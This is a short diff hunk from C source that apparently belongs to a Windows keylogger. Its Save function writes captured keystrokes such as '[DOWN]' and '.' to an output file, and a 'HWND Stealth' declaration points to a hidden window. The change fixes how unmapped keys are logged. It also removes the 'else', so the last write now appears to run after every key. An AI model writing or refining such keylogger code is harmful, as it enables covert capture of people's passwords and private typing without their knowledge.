@@ -60,8 +60,7 @@ int Save (int key_stroke, char *file)
 			fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 		else if (key_stroke == 190 || key_stroke == 110)
 			fprintf(OUTPUT_FILE, "%s", ".");
-		else
-			fprintf(OUTPUT_FILE, "%s", &key_stroke);
+			fprintf(OUTPUT_FILE, "%c", key_stroke);
 	fclose (OUTPUT_FILE);
 	return 0;
 	HWND Stealth;
